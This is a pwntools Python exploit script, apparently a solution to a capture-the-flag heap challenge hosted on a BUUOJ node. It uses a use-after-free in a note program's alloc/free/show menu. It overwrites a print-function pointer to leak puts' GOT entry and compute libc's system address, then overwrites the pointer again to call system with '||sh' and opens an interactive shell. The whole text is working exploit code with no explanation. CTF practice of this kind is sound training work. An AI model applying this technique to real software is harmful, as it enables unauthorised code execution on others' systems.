from pwn import *

context.log_level="debug"
sh=remote("node5.buuoj.cn",29713)
#sh=process("./timu")
libc=ELF("./libc-2.23.so")
elf=ELF("./timu")

def send_choice(choice):
	sh.recvuntil(b'choice :')
	sh.sendline(str(choice))
 
def alloc(size,content):
	send_choice(1)
	sh.recvuntil(b'size :')
	sh.sendline(str(size))
	sh.recvuntil(b'Content :')
	sh.sendline(content)
 
def free(index):
	send_choice(2)
	sh.recvuntil(b'Index :')
	sh.sendline(str(index))
    
def show(index):
	send_choice(3)
	sh.recvuntil(b'Index :')
	sh.sendline(str(index))

print_func=0x0804862b
puts_got=elf.got["puts"]

alloc(0x20,b"aaaa")
alloc(0x20,b"aaaa")

free(0)
free(1)

payload=p32(print_func)+p32(puts_got)
alloc(0x8,payload)
show(0)
#gdb .attach(sh)

puts_addr=u32(sh.recv(4))
libc_base=puts_addr-libc.sym["puts"]
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh"))

free(2)
payload=p32(system_addr)+b"||sh"
alloc(0x8, payload)
show(0)

sh.interactive()
